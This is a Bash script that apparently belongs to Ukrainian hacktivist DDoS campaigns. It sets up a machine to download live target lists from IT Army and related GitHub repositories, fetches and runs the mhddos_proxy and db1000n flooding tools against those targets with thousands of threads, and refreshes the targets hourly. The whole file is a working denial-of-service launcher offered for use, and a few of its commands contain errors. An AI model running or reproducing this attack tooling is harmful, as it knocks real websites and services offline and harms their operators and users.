#!/bin/bash

##########################################
##### SETTINGS ###########################
##########################################
export methods="--http-methods GET STRESS"
export ddos_size="L"
export shape="0"
export gotop="on"
declare -a itarmy_paths=(
    ".jobs[].args.packet.payload.data.path"
    ".jobs[].args.connection.args.address"
    )
packets="tmux jq git python3 python3-pip python3-venv iproute2"
IFACE=$(ip -o -4 route show to default | awk '{print $5}')
export IFACE
export cloudflare="off";
export db1000n="off";

##########################################
##### FUNCTIONS ##########################
##########################################

function get_targets () {
    rm -rf ~/multidd/targets/*
    # 1 DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
    curl -s -X GET "https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt" -o ~/multidd/targets/source0.txt
    # 2 IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
    curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" -o ~/multidd/targets/db1000n.json
    local i=1
    for path in "${itarmy_paths[@]}"
    do
        jq -r "$path" < ~/multidd/targets/db1000n.json  | sed '/null/d' > ~/multidd/targets/source$i.txt
        if [[ $path == ".jobs[].args.connection.args.address" ]]
        then
             sed -i '/^[[:space:]]*$/d' ~/multidd/targets/source$i.txt
        else
            $line > ~/multidd/targets/source$i.txt
        fi
        i=$((i+1))
    done
    rm -f ~/multidd/targets/db1000n.json
    # remove all empty lines (spaces, tabs, new lines)
    sed -i '/^[[:space:]]*$/d' ~/multidd/targets/source*.txt
    local lines
    lines=$(cat ~/multidd/targets/source*)
    for line in $lines
    do
        if [[ $line == "http"* ]] || [[ $line == "tcp://"* ]]; then
            echo "$line" >> ~/multidd/targets/all_targets.txt
        fi
    done
    local total_targets
    total_targets=$(wc -l < ~/multidd/targets/all_targets.txt)
    echo -e "Всього цілей: $total_targets"
    sort < ~/multidd/targets/all_targets.txt | uniq | sort -R > ~/multidd/targets/uniq_targets.txt
    local uniq_targets
    uniq_targets=$(wc -l < ~/multidd/targets/uniq_targets.txt)
    echo -e "Унікальних цілей: $uniq_targets"
    sleep 30
}
export get_targets
#########################################
function launch () {
    # tmux mouse support
    grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
    tmux source-file ~/.tmux.conf > /dev/null 2>&1
    if [[ $gotop == "on" ]]; then
        if [ ! -f "/usr/local/bin/gotop" ]; then
            curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
            sudo dpkg -i gotop.deb
        fi
        tmux new-session -s multidd -d 'gotop -sc solarized'
        tmux split-window -h -p 66 'bash auto_bash.sh'
    else
        tmux new-session -s multidd -d 'bash auto_bash.sh'
    fi
    tmux attach-session -t multidd
}
#########################################
function cleanup() {
    deactivate
    if [[ $shape == "on" ]]; then
        IFACE=$(ip -o -4 route show to default | awk '{print $5}')
        sudo "$WS" -c -a "$IFACE"
    fi
    tmux kill-session -t multidd > /dev/null 2>&1
    rm -rf ~/multidd/
}
export cleanup
#########################################

##########################################
##### MAIN FLOW ##########################
##########################################
clear && echo -e "Loading... v1.2f\n"
if [[ $(swapon --noheadings --bytes | cut -d " " -f3) == "" ]]; then
    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
fi
sudo apt-get update -q -y > /dev/null 2>&1
for packet in $packets
do
    printf "Встановлення %10s..." "$packet"
    sudo apt-get install -q -y "$packet" > /dev/null 2>&1
    printf "\t [OK]\n"
done
python3 -m venv ~/multidd/venv
# shellcheck disable=1090 # Шелчек не потрібний в заводських скриптах python
source ~/multidd/venv/bin/activate
mkdir -p ~/multidd/targets/
cd ~/multidd || return
while [ "$1" != "" ]; do
    case $1 in
        -g | --gotop ) gotop="off"; shift ;;
        --XS ) export ddos_size="XS"; shift ;;
        --S | --lite ) export ddos_size="S"; shift ;;
        --M ) export ddos_size="M"; shift ;;
        --L ) export ddos_size="L"; shift ;;
        --XL ) export ddos_size="XL"; shift ;;
        --XXL  | --2XL) export ddos_size="XXL"; shift ;;
        --XXXL | --3XL) export ddos_size="XXXL"; shift ;;
        -s | --shape ) export shape="on"; export shape_limit="$(($2*1024))"; shift 2 ;;
        -c | --cloudflare ) export cloudflare="on"; shift;;
        -d | --db1000n ) export db1000n="on"; shift;;
        *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
    esac
done
if [[ $shape == "on" ]]; then
    printf "Розпаковка wondershaper..."
    git clone https://github.com/magnific0/wondershaper.git > /dev/null 2>&1
    printf "\t [OK]\n"
    WS=$HOME'/multidd/wondershaper/wondershaper'
    export WS
    sudo "$WS" -a "$IFACE" -u "$shape_limit" -d "$shape_limit"
fi
if [[ $cloudflare == "on" ]]
then
    printf "Підготовка cloudflare..."
    curl https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
    printf "\t [OK]\n"
    printf "Підготовка пакетів..."
    sudo apt update > /dev/null 2>&1
    printf "\t [OK]\n"
    printf "Завантаження cloudflare..."
    sudo apt install cloudflare-warp > /dev/null 2>&1
    printf "\t [OK]\n"
    printf "Реєстрація у cloudflare..."
    yes | warp-cli register > /dev/null 2>&1
    printf "\t [OK]\n"

fi
if [[ $db1000n == "on" ]]
then
    printf "Завантаження db1000n..."
    curl -s -X "https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64.tar.gz" -o ~/multidd/db1000n.tar.gz  > /dev/null 2>&1
    printf "\t [OK]\n"
    printf "Розпаковка db1000n..."
    mkdir ~/multidd/db1000n > /dev/null 2>&1
    tar -xf ~/multidd/db1000n.tar.gz -C ~/multidd/db1000n > /dev/null 2>&1
    chmod +X ~/multidd/db1000n/db1000n
    printf "\t [OK]\n"
fi
# create small separate script to re-launch only this small part of code
cd ~/multidd || return
cat > auto_bash.sh << 'EOF'
#!/bin/bash

runner="$HOME/multidd/mhddos_proxy/runner.py"

# Restart and update mhddos_proxy and targets every 30 minutes
while true; do
    #install mhddos_proxy
    cd ~/multidd/ || return
    git clone https://github.com/LordWarWar/mhddos_proxy.git
    cd ~/multidd/mhddos_proxy || return
    python3 -m pip install -r requirements.txt
    if [[ $cloudflare == "on" ]]
    then
        warp-cli connect
    fi
    if [[ $db1000n == "on" ]]
    then
        ~/multidd/db1000n/db1000n &
    fi
    if [[ $ddos_size == "XS" ]]; then
        tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
        python3 "$runner" -c ~/multidd/targets/lite_targets.txt "$methods" -t 1000 $args_to_pass &
    elif [[ $ddos_size == "S" ]]; then
        tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
        python3 "$runner" -c ~/multidd/targets/lite_targets.txt "$methods" -t 2000 $args_to_pass &
    elif [[ $ddos_size == "M" ]]; then
        cd ~/multidd/targets/ || return
        split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt
        cd ~/multidd/mhddos_proxy || return #split targets in 2 parts
        python3 "$runner" -c ~/multidd/targets/xaa.uaripper "$methods" -t 2000 $args_to_pass &
        sleep 30
        python3 "$runner" -c ~/multidd/targets/xab.uaripper "$methods" -t 2000 $args_to_pass &
    elif [[ $ddos_size == "L" ]]; then
        cd ~/multidd/targets/ || return
        split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt
        cd ~/multidd/mhddos_proxy || return #split targets in 2 parts
        python3 "$runner" -c ~/multidd/targets/xaa.uaripper "$methods" -t 4000 $args_to_pass &
        sleep 30
        python3 "$runner" -c ~/multidd/targets/xab.uaripper "$methods" -t 4000 $args_to_pass &
    elif [[ $ddos_size == "XL" ]]; then
        cd ~/multidd/targets/ || return
        split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt
        cd ~/multidd/mhddos_proxy || return #split targets in 4 parts
        python3 "$runner" -c ~/multidd/targets/xaa.uaripper "$methods" -t 3000 $args_to_pass &
        python3 "$runner" -c ~/multidd/targets/xab.uaripper "$methods" -t 3000 $args_to_pass &
        sleep 30
        python3 "$runner" -c ~/multidd/targets/xac.uaripper "$methods" -t 3000 $args_to_pass &
        python3 "$runner" -c ~/multidd/targets/xad.uaripper "$methods" -t 3000 $args_to_pass &
    elif [[ $ddos_size == "XXL" ]]; then
        cd ~/multidd/targets/ || return
        split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt
        cd ~/multidd/mhddos_proxy || return #split targets in 4 parts
        python3 "$runner" -c ~/multidd/targets/xaa.uaripper "$methods" -t 4000 $args_to_pass &
        python3 "$runner" -c ~/multidd/targets/xab.uaripper "$methods" -t 4000 $args_to_pass &
        sleep 30
        python3 "$runner" -c ~/multidd/targets/xac.uaripper "$methods" -t 4000 $args_to_pass &
        python3 "$runner" -c ~/multidd/targets/xad.uaripper "$methods" -t 4000 $args_to_pass &
    elif [[ $ddos_size == "XXXL" ]]; then
        cd ~/multidd/targets/ || return
        split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt
        cd ~/multidd/mhddos_proxy || return #split targets in 4 parts
        python3 "$runner" -c ~/multidd/targets/xaa.uaripper "$methods" -t 5000 $args_to_pass &
        python3 "$runner" -c ~/multidd/targets/xab.uaripper "$methods" -t 5000 $args_to_pass &
        sleep 30
        python3 "$runner" -c ~/multidd/targets/xac.uaripper "$methods" -t 5000 $args_to_pass &
        python3 "$runner" -c ~/multidd/targets/xad.uaripper "$methods" -t 5000 $args_to_pass &
    fi
    sleep 60m
    pkill -f start.py; pkill -f runner.py;
    get_targets
    rm -rf ~/multidd/mhddos_proxy/
    if [[ $db1000n == "on" ]]
    then
        pkill -f db1000n
    fi
    if [[ $cloudflare == "on" ]]
    then
        warp-cli disconnect
    fi
done
EOF
trap cleanup INT
get_targets
launch
cleanup